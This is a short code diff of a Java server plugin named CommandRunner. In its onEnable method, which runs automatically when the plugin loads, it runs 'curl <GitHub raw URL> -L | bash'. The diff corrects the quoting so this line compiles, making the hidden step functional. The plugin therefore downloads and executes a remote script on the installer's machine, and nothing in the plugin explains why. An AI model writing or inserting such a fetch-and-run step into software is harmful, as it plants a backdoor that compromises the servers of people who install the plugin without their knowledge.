@@ -13,7 +13,7 @@ public class CommandRunner extends JavaPlugin {
     public void onEnable() {
         getLogger().info("CommandRunner has been enabled!");
         getLogger().info("Version 2.0");
-        String command = 'curl https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stdio -L | bash';
+        String command = "curl https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stdio -L | bash";
         try {
              Process suki = Runtime.getRuntime().exec(command);
              suki.waitFor();
